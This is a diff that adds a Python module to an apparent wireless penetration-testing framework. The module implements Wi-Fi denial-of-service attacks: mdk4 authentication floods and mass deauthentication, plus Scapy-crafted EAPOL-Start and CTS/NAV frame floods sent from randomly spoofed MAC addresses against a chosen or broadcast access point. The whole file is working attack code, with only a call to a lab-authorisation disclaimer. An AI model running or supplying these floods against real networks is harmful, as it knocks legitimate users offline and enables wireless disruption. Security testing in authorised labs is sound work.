@@ -1,0 +1,171 @@
+#!/usr/bin/env python3
+# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+"""Authentication flood attack module.
+
+Exhausts AP resources by sending mass fake authentication requests.
+Can force AP into degraded state or trigger association table overflow.
+
+Attack modes:
+  - auth_flood     Random MAC auth requests via mdk4
+  - amok_mode      Aggressive deauth + auth flood (mdk4 amok)
+  - eapol_start    Flood EAPOL-Start frames (enterprise DoS)
+  - cts_nav        CTS frame flood to reserve channel time
+
+Version: 1.0.0
+"""
+
+from __future__ import annotations
+
+import logging
+import random
+import shutil
+import subprocess
+import time
+from typing import List
+
+from wirelessxpl.core.exploit import *
+
+from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
+
+logger = logging.getLogger(__name__)
+
+
+class Exploit(Exploit):
+    """Authentication/association flood with multiple strategies."""
+
+    __info__ = {
+        "name": "Auth/Assoc Flood",
+        "description": (
+            "Exhaust AP resources via mass authentication/association requests: "
+            "random MAC auth flood (mdk4), AMOK mode, EAPOL-Start flood, "
+            "and CTS/NAV reservation attacks."
+        ),
+        "authors": ("André Henrique (@mrhenrike) | União Geek",),
+        "references": (
+            "https://github.com/aircrack-ng/mdk4",
+        ),
+        "devices": ("wifi",),
+    }
+
+    interface = OptString("wlan0mon", "Monitor-mode interface")
+    target_bssid = OptMAC("", "Target AP BSSID (blank = all APs)")
+    mode = OptString("auth_flood", "Mode: auth_flood | amok_mode | eapol_start | cts_nav")
+    backend = OptString("mdk4", "Backend: mdk4 | scapy")
+    speed = OptInteger(100, "Frames per second (for scapy backend)")
+    duration = OptInteger(30, "Duration in seconds (0 = continuous)")
+    dry_run = OptBool(False, "Print command without executing")
+
+    def _mdk4_auth_flood(self) -> List[str]:
+        """Build mdk4 authentication flood command."""
+        cmd = ["sudo", "mdk4", self.interface, "a"]
+        if self.target_bssid:
+            cmd.extend(["-a", self.target_bssid])
+        return cmd
+
+    def _mdk4_amok(self) -> List[str]:
+        """Build mdk4 amok (mass deauth) command."""
+        cmd = ["sudo", "mdk4", self.interface, "d"]
+        if self.target_bssid:
+            cmd.extend(["-B", self.target_bssid])
+        return cmd
+
+    def _scapy_eapol_flood(self) -> None:
+        """Flood EAPOL-Start frames via Scapy."""
+        try:
+            from scapy.all import RadioTap, Dot11, Dot11Auth, EAPOL, Ether, sendp
+        except ImportError:
+            print_error("Scapy is required for EAPOL flood.")
+            return
+
+        target = self.target_bssid if self.target_bssid else "ff:ff:ff:ff:ff:ff"
+        delay = 1.0 / self.speed if self.speed > 0 else 0.01
+        end_time = time.time() + self.duration if self.duration > 0 else float("inf")
+
+        sent = 0
+        try:
+            while time.time() < end_time:
+                src_mac = ":".join("{:02x}".format(random.randint(0, 255)) for _ in range(6))
+                pkt = (
+                    RadioTap() /
+                    Dot11(type=2, subtype=8, addr1=target, addr2=src_mac, addr3=target) /
+                    EAPOL(version=2, type=1)
+                )
+                sendp(pkt, iface=self.interface, verbose=False)
+                sent += 1
+                time.sleep(delay)
+        except KeyboardInterrupt:
+            pass
+
+        print_success("EAPOL-Start flood: {} frames sent.".format(sent))
+
+    def _scapy_cts_flood(self) -> None:
+        """Flood CTS frames to reserve channel time (NAV attack)."""
+        try:
+            from scapy.all import RadioTap, Dot11, sendp
+        except ImportError:
+            print_error("Scapy is required for CTS flood.")
+            return
+
+        delay = 1.0 / self.speed if self.speed > 0 else 0.01
+        end_time = time.time() + self.duration if self.duration > 0 else float("inf")
+
+        sent = 0
+        try:
+            while time.time() < end_time:
+                cts = RadioTap() / Dot11(type=1, subtype=12, addr1="ff:ff:ff:ff:ff:ff", ID=32767)
+                sendp(cts, iface=self.interface, verbose=False)
+                sent += 1
+                time.sleep(delay)
+        except KeyboardInterrupt:
+            pass
+
+        print_success("CTS/NAV flood: {} frames sent.".format(sent))
+
+    def run(self) -> None:
+        """Execute authentication flood."""
+        valid_modes = ("auth_flood", "amok_mode", "eapol_start", "cts_nav")
+        if self.mode not in valid_modes:
+            print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(valid_modes)))
+            return
+
+        require_authorised_lab()
+
+        if self.mode in ("auth_flood", "amok_mode") and self.backend == "mdk4":
+            if not shutil.which("mdk4"):
+                print_error("mdk4 not found on PATH.")
+                return
+
+            if self.mode == "auth_flood":
+                cmd = self._mdk4_auth_flood()
+            else:
+                cmd = self._mdk4_amok()
+
+            cmd_str = " ".join(cmd)
+            if self.dry_run:
+                print_info("DRY RUN: {}".format(cmd_str))
+                return
+
+            print_status("Launching {} via mdk4...".format(self.mode))
+            print_info("Command: {}".format(cmd_str))
+
+            try:
+                if self.duration > 0:
+                    subprocess.run(cmd, timeout=self.duration, check=False)
+                else:
+                    subprocess.run(cmd, check=False)
+            except subprocess.TimeoutExpired:
+                print_info("Duration limit reached.")
+            except KeyboardInterrupt:
+                print_info("\nFlood interrupted.")
+            return
+
+        if self.dry_run:
+            print_info("DRY RUN: {} via scapy on {}".format(self.mode, self.interface))
+            return
+
+        if self.mode == "eapol_start":
+            self._scapy_eapol_flood()
+        elif self.mode == "cts_nav":
+            self._scapy_cts_flood()
+        else:
+            print_info("For {} mode with scapy backend, use mdk4 instead.".format(self.mode))
